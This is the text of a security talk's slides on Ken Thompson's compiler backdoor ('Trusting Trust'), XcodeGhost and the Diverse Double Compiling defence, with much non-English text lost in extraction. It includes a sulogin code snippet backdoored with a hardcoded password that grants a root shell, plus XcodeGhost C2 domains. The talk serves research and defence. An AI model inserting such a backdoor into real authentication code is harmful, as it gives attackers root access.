

 --Reflection on trusting trust
redrain

Whoami
· 360-CERT ·  · APT · AtlassianGoogle Hall of Fame · HITBDefconCansecwestSyscanTeam Cymru · APT

Whoami

KTH`Ken Thompson Hack'
An acceptance speech from Turing award

· 1983UNIXKen
· Ken "Reflections on Trusting Trust"

https://www.archive.ece.cmu.edu/~ganger/712.fall02/papers/p761-thompson.pdf

What I am about to describe is one of many "chicken and egg" problems that arise when compilers are written in their own language.
--<Reflections on Trusting Trust> STAGEII

The problem
· 
· 
· 
· !
· 
· hosting-compiler! · -> Eg. GCC compiles GCC
· ...,???

Self-reproducing program (Quine)
More precisely stated, the problem is to write a source program that, when compiled and executed, will produce as output an exact copy of its source.

Self-reproducing program (Quine)

Self-reproducing program (Quine)
· "Hello World\n" · [This] is an idealization of the code in the C compiler that interprets the character escape sequence. This is an amazing piece of code. It "knows" in a completely portable way what character code is compiled for a new line in any character set. The act of knowing then allows it to recompile itself, thus perpetuating the knowledge.

Self-reproducing program (Quine)
"" """" 

Sulogin compiler-backdoor
Ken UNIX 1943PDP-11 UNIXKen UNIX Ken 

Sulogin compiler-backdoor

Linux Recovery suloginroot password root shell
...

while (pwd) {
if ((p = getpasswd(pwd->pw_passwd)) == NULL)
break;
if (pwd->pw_passwd[0] == 0 ||
strcmp(p, "rr") == 0 ||
strcmp(crypt(p, pwd->pw_passwd), pwd->pw_passwd) == 0)
sushell(pwd);
mask_signal(SIGQUIT, SIG_IGN, &saved_sigquit); mask_signal(SIGTSTP, SIG_IGN, &saved_sigtstp); mask_signal(SIGINT, SIG_IGN, &saved_sigint); fprintf(stderr, _("Login incorrect\n\n"));
}

Sulogin compiler-backdoor
    
1. AST
2. 

AST  Ken 

Sulogin compiler-backdoor

sulogin 
  ""

Sulogin compiler-backdoor
·  ·  · 

Sulogin compiler-backdoor

Sulogin compiler-backdoor

Sulogin compiler-backdoor
· tcc-new · tcc-newtcc-origtcc-orig · tcc-orig · sulogin · tcc-origtcc
·  · 

Deniable Backdoors Using Compiler Bugs
PoC||GTFO  · bug · quite regular patch
· sudo

Deniable Backdoors Using Compiler Bugs
https://github.com/regehr/sudo1.8.13/blob/compromise/backdoorinfo/verify-patch.c

Deniable Backdoors in Other Way
2018HITB CLR(Common Language Runtime ) 
https://conference.hitb.org/hitbsecconf201 8ams/sessions/attacking-microsofts-netframework-through-clr/

Deniable Backdoors in Other Way
KTH vxjumpnEINEI 2011coff-obj  
http://www.vxjump.net/files/virus_analysis /infect_coff-obj.txt


·  obj
·  
· link

Deniable Backdoors in Other Way

Is Compiler Hack Still a Threat?

Is Compiler Hack Still a Threat?
2009Sophos Induc Delphi  


 

Is Compiler Hack Still a Threat?

Is Compiler Hack Still a Threat?
2015 Xcodeapp  

Is Compiler Hack Still a Threat?
 APP xcode Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/Library/Frameworks/CoreS ervices.framework xcode `xcode'CoreServices.framework https://github.com/XcodeGhostSource/XcodeGhost

Is Compiler Hack Still a Threat?
· XcodeGhostbundle id() 
· XcodeGhostOpenURL()

Is Compiler Hack Still a Threat?
·http://init.crash-analytics[.]com ·http://init.icloud-diagnostics[.]com ·http://init.icloud-analysis[.]com

Is Compiler Hack Still a Threat?
·  /Applications/Xcode.app/Contents/PlugIns /Xcode3Core.ideplugin/Contents/SharedSu pport/Developer/Library/Xcode/Plugins/CoreBuildTasks.xcplugin/Contents/Reso urces/Ld.xcspec
·  "-force_load" $(PLATFORM_DEVELOPER_SDK_DIR)/Librar y/Frameworks/CoreServices.framework/Cor eService

Is Compiler Hack Still a Threat?
· KTH(,) ·  () ·  Xcode  · 

Is Compiler Hack Still a Threat?

9.12

9.14

9.17

9.17

 Bug

CNCERT 

 

 

9.18
PANW 

 
9.22

 UnityGhost
9.21

 
9.19

 
9.19

360 APP
9.18

Is Compiler Hack Still a Threat?

Is Compiler Hack Still a Threat?

Possible defence
"Fully Countering Trusting Trust through Diverse Double-Compiling (DDC) - Countering Trojan Horse attacks on Compilers"
2009 PhD dissertation by David A. Wheeler George Mason University
http://www.dwheeler.com/trusting-trust/dissertation/wheeler-trusting-trust-ddc.pdf

Diverse Double Compiling (DDC)

· 

·  · 

Diverse Double Compiling (DDC)

 GCC
 TCC

SourceGCC
SourceGCC
Selfregeneration test (Control)

GCC
GCC (c. GCC)
GCC (c. GCC, c. GCC)

TCC
GCC (c. TCC)
GCC (c. GCC, c. TCC)

Should be identical

SourceGCC SourceGCC

Diverse Double Compiling (DDC)
DDC
· (TCC)GCC · TCCGCC ·  P.S. 
DDCn2 n

